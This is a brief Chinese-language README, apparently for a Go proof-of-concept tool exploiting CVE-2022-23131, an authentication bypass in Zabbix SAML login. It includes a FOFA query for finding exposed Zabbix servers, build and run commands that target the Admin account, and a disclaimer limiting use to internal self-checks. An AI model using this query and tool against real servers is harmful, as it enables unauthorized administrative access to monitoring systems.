# zabbix-saml-bypass-poc

 cve-2022-23131 

本程序仅供甲方企业用户人员内部风险自查使用，禁止用于任何形式的未授权安全测试。

```
fofa: app="ZABBIX-监控系统" && body="saml" 
```

使用方法：

```
go build -o zexp  
chmod a+x zexp
./zexp check -t https://x.x.x.x/index.php -u Admin
```

截图：

![image-20220221122155042](docs/image-20220221122155042.png)

![image-20220221122233215](docs/image-20220221122233215.png)
